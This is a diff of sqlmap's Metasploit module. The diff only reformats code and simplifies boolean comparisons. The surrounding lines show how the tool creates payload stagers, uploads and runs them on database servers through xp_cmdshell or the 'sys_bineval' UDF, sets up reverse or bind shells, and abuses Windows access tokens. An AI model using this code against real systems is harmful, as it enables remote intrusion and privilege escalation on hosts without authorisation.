@@ -22,8 +22,6 @@ with sqlmap; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 
-
-
 import os
 import re
 import stat
@@ -131,7 +129,6 @@ class Metasploit:
                                       "reverse": "local port number",
                                     }
 
-
     def __skeletonSelection(self, msg, lst=None, maxValue=1, default=1):
         if kb.os == "Windows":
             opSys = "windows"
@@ -177,21 +174,18 @@ class Metasploit:
 
         return choice
 
-
     def __selectSMBPort(self):
         return self.__skeletonSelection("SMB port", self.__msfSMBPortsList)
-
 
     def __selectEncoder(self, encode=True):
         if isinstance(encode, str):
             return encode
 
-        elif kb.os == "Windows" and encode is True:
+        elif kb.os == "Windows" and encode:
             return self.__skeletonSelection("payload encoding", self.__msfEncodersList)
 
-
     def __selectPayload(self, askChurrasco=True):
-        if kb.os == "Windows" and conf.privEsc == True:
+        if kb.os == "Windows" and conf.privEsc:
             infoMsg  = "forcing Metasploit payload to Meterpreter because "
             infoMsg += "it is the only payload that can abuse Windows "
             infoMsg += "Access Tokens via Meterpreter 'incognito' "
@@ -229,7 +223,7 @@ class Metasploit:
                 warnMsg += "or the Administrator is not logged in"
                 logger.warn(warnMsg)
 
-            if choose == True:
+            if choose:
                 message  = "what do you want to do?\n"
                 message += "[1] Give it a try anyway\n"
                 message += "[2] Fall back to Meterpreter payload (default)\n"
@@ -254,7 +248,7 @@ class Metasploit:
 
                             break
 
-                        elif askChurrasco is False:
+                        elif not askChurrasco:
                             logger.warn("beware that the VNC injection might not work")
 
                             break
@@ -262,7 +256,7 @@ class Metasploit:
                         elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                             uploaded = self.uploadChurrasco()
 
-                            if uploaded == False:
+                            if not uploaded:
                                 warnMsg  = "beware that the VNC injection "
                                 warnMsg += "might not work"
                                 logger.warn(warnMsg)
@@ -277,12 +271,10 @@ class Metasploit:
 
         return __payloadStr
 
-
     def __selectPort(self):
         for connType, connStr in self.__portData.items():
             if self.connectionStr.startswith(connType):
                 return self.__skeletonSelection(connStr, maxValue=65535, default=randomRange(1025, 65535))
-
 
     def __selectRhost(self):
         if self.connectionStr.startswith("bind"):
@@ -300,9 +292,8 @@ class Metasploit:
         else:
             raise sqlmapDataException, "unexpected connection type"
 
-
     def __selectLhost(self):
-        if self.connectionStr.startswith("reverse") or self.resourceFile != None:
+        if self.connectionStr.startswith("reverse") or self.resourceFile is not None:
             message = "which is the local address? [%s] " % self.localIP
             address = readInput(message, default=self.localIP)
 
@@ -317,10 +308,8 @@ class Metasploit:
         else:
             raise sqlmapDataException, "unexpected connection type"
 
-
     def __selectConnection(self):
         return self.__skeletonSelection("connection type", self.__msfConnectionsList)
-
 
     def __prepareIngredients(self, encode=True, askChurrasco=True):
         self.connectionStr  = self.__selectConnection()
@@ -334,7 +323,6 @@ class Metasploit:
             self.payloadConnStr = "%s_%s" % (self.payloadStr, self.connectionStr)
         else:
             self.payloadConnStr = "%s/%s" % (self.payloadStr, self.connectionStr)
-
 
     def __forgeMsfCliCmd(self, exitfunc="process"):
         self.__cliCmd  = "%s multi/handler PAYLOAD=%s" % (self.__msfCli, self.payloadConnStr)
@@ -355,10 +343,8 @@ class Metasploit:
 
         self.__cliCmd += " E"
 
-
     def __forgeMsfConsoleCmd(self):
         self.__consoleCmd = "%s -r %s" % (self.__msfConsole, self.resourceFile)
-
 
     def __forgeMsfConsoleResource(self):
         self.resourceFile = os.path.join(conf.outputPath, self.__randFile)
@@ -386,7 +372,6 @@ class Metasploit:
         self.resourceFp.write(self.__resource)
         self.resourceFp.close()
 
-
     def __forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):
         self.__payloadCmd  = "%s %s" % (self.__msfPayload, self.payloadConnStr)
         self.__payloadCmd += " EXITFUNC=%s" % exitfunc
@@ -406,7 +391,6 @@ class Metasploit:
         else:
             self.__payloadCmd += " X > %s" % outFile
 
-
     def __runMsfCli(self, exitfunc):
         self.__forgeMsfCliCmd(exitfunc)
 
@@ -417,7 +401,6 @@ class Metasploit:
         logger.debug("executing local command: %s" % self.__cliCmd)
         self.__msfCliProc = execute(self.__cliCmd, shell=True, stdin=PIPE, stdout=PIPE)
 
-
     def __runMsfConsole(self):
         infoMsg = "running Metasploit Framework 3 console locally, wait.."
         logger.info(infoMsg)
@@ -425,14 +408,12 @@ class Metasploit:
         logger.debug("executing local command: %s" % self.__consoleCmd)
         self.__msfConsoleProc = execute(self.__consoleCmd, shell=True, stdin=PIPE, stdout=PIPE)
 
-
     def __runMsfShellcodeRemote(self):
         infoMsg  = "running Metasploit Framework 3 shellcode "
         infoMsg += "remotely via UDF 'sys_bineval', wait.."
         logger.info(infoMsg)
 
         self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")
-
 
     def __runMsfPayloadRemote(self):
         infoMsg  = "running Metasploit Framework 3 payload stager "
@@ -444,14 +425,13 @@ class Metasploit:
 
         cmd = "%s &" % self.exeFilePathRemote
 
-        if self.cmdFromChurrasco == True:
+        if self.cmdFromChurrasco:
             cmd = "%s \"%s\"" % (self.churrascoPath, cmd)
 
         if kb.dbms == "Microsoft SQL Server":
             cmd = self.xpCmdshellForgeCmd(cmd)
 
         self.execCmd(cmd, silent=True)
-
 
     def __loadMetExtensions(self, proc, metSess):
         if kb.os != "Windows":
@@ -468,7 +448,7 @@ class Metasploit:
         proc.stdin.write("use priv\n")
         proc.stdin.write("use sniffer\n")
 
-        if conf.privEsc == True:
+        if conf.privEsc:
             print
 
             infoMsg  = "displaying the list of Access Tokens availables. "
@@ -477,7 +457,6 @@ class Metasploit:
             logger.info(infoMsg)
 
             proc.stdin.write("list_tokens -u\n")
-
 
     def __controlMsfCmd(self, proc, func):
         stdin_fd = sys.stdin.fileno()
@@ -536,7 +515,6 @@ class Metasploit:
 
                 return returncode
 
-
     def createMsfShellcode(self, exitfunc, format, extra, encode):
         infoMsg = "creating Metasploit Framework 3 multi-stage shellcode "
         logger.info(infoMsg)
@@ -578,9 +556,8 @@ class Metasploit:
 
         os.unlink(self.__shellcodeFilePath)
 
-
     def createMsfPayloadStager(self, initialize=True):
-        if initialize == True:
+        if initialize:
             infoMsg = ""
         else:
             infoMsg = "re"
@@ -608,10 +585,10 @@ class Metasploit:
             self.exeFilePathLocal = os.path.join(conf.outputPath, "sqlmapmsf%s" % self.__randStr)
             self.__fileFormat     = "elf"
 
-        if initialize == True:
+        if initialize:
             self.__initVars()
 
-        if self.payloadStr == None:
+        if self.payloadStr is None:
             self.__prepareIngredients()
 
         self.__forgeMsfPayloadCmd("process", self.__fileFormat, self.exeFilePathLocal)
@@ -657,7 +634,6 @@ class Metasploit:
             errMsg = "failed to create the payload stager (%s)" % payloadStderr
             raise sqlmapFilePathException, errMsg
 
-
     def uploadMsfPayloadStager(self):
         self.exeFilePathRemote = "%s/%s" % (conf.tmpPath, os.path.basename(self.exeFilePathLocal))
 
@@ -666,9 +642,8 @@ class Metasploit:
 
         os.unlink(self.exeFilePathLocal)
 
-
     def pwn(self, goUdf=False):
-        if goUdf is True:
+        if goUdf:
             exitfunc = "thread"
             func     = self.__runMsfShellcodeRemote
         else:
@@ -684,9 +659,8 @@ class Metasploit:
         debugMsg += "with return code %s" % self.__controlMsfCmd(self.__msfCliProc, func)
         logger.debug(debugMsg)
 
-        if goUdf is False:
+        if not goUdf:
             self.delRemoteFile(self.exeFilePathRemote, doubleslash=True)
-
 
     def smb(self):
         self.__initVars()
@@ -707,7 +681,6 @@ class Metasploit:
         logger.debug(debugMsg)
 
         os.unlink(self.resourceFile)
-
 
     def bof(self):
         self.__runMsfCli(exitfunc="seh")
